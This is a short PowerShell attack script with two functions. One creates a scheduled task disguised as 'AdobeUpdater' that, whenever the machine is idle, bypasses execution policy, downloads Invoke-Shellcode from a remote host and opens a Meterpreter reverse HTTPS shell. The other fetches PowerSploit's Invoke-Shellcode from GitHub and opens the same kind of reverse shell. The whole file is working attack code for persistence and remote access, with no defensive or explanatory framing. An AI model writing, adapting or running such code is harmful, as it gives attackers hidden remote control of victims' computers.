Function Infect
{
  
schtasks /create  /TN AdobeUpdater /TR 'powershell.exe -ExecutionPolicy Bypass -c IEX ((New-Object Net.WebClient).DownloadString('http://1.1.11/Invoke-Shellcode')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 1.1.11 -Lport 8000 -Force'/sc onidle /i 1

}





function FetchCommands
{
  IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 1.1.1.1  -Lport 8000 -Force 
  
}
